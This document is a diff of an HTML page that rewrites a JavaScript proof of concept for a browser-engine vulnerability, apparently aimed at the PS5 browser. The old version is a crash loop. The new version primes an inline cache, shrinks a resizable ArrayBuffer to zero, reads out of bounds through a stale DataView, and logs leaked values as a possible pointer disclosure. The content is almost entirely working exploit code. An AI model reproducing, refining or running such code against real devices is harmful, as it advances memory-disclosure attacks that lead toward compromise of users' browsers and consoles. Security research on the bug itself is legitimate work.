@@ -1,33 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2025-43541</title>
+<meta charset="utf-8">
+<title>PS5 CVE-2025-43541 OOB Read Test</title>
 </head>
 <body>
-    <h1>CVE-2025-43541</h1>
-    <script>
-        const crash_point = 0x4141414141414141;
-        const loop_start = crash_point & 0xffffff00;
-        const loop_end = crash_point + 1;
-        for (let i = 0; i < 5000; i++) {
-            console.log(i)
-            const get_byte_length = arr => arr.byteLength;
-            const ab = new ArrayBuffer(99, { maxByteLength: 99 });
-            const dv = new DataView(ab, 1, 44);
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<script>
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-            for (let counter = loop_start; counter < loop_end; counter++) {
-                if (counter === loop_end - 2) {
-                    ab.resize(1);
-                    get_byte_length(1);
-                } else {
-                    try {
-                        get_byte_length(dv);
-                    } catch (e) { }
-                }
-            }
-        }
-    </script>
+L('[*] Starting CVE-2025-43541 optimized test...');
+
+try {
+    // 1. Create a resizable ArrayBuffer
+    const ab = new ArrayBuffer(1024, { maxByteLength: 4096 });
+    
+    // 2. Create a DataView over it
+    const dv = new DataView(ab, 0, 1024);
+    
+    // 3. Prime the inline cache (IC) with a small loop, not 282 billion
+    const get_byte_length = arr => arr.byteLength;
+    for (let i = 0; i < 100; i++) {
+        get_byte_length(dv);
+    }
+    
+    L('[*] Initial state:');
+    L('  AB byteLength: ' + ab.byteLength);
+    L('  DV byteLength: ' + dv.byteLength);
+    
+    // 4. Resize the ArrayBuffer to 0 to invalidate the backing store
+    L('[*] Resizing ArrayBuffer to 0...');
+    ab.resize(0);
+    
+    L('[*] Post-resize state:');
+    L('  AB byteLength: ' + ab.byteLength);
+    
+    // 5. Check if DataView's length was updated
+    let dvLen = get_byte_length(dv);
+    L('  DV byteLength (via IC): ' + dvLen);
+    
+    // Also try the original PoC's integer trick
+    let intLen = get_byte_length(1);
+    L('  Integer byteLength (via IC): ' + intLen);
+    
+    // 6. Attempt to read out-of-bounds memory
+    L('[*] Attempting OOB reads...');
+    
+    try {
+        let val1 = dv.getUint32(0);
+        L('[!] READ SUCCESS at offset 0: 0x' + (val1 >>> 0).toString(16));
+        
+        let val2 = dv.getUint32(4);
+        L('[!] READ SUCCESS at offset 4: 0x' + (val2 >>> 0).toString(16));
+        
+        // Try to read a potential pointer (8 bytes)
+        let high = dv.getUint32(8);
+        let low = dv.getUint32(12);
+        L('[!] READ SUCCESS at offset 8-12: 0x' + (high >>> 0).toString(16) + (low >>> 0).toString(16));
+        
+        L('[+] If values are not 0, we have an OOB info leak!');
+    } catch (e) {
+        L('[!] OOB Read failed: ' + e.message);
+    }
+    
+} catch(e) {
+    L('[!] Error during setup: ' + e.message);
+}
+
+L('[*] Test finished.');
+</script>
 </body>
 </html>
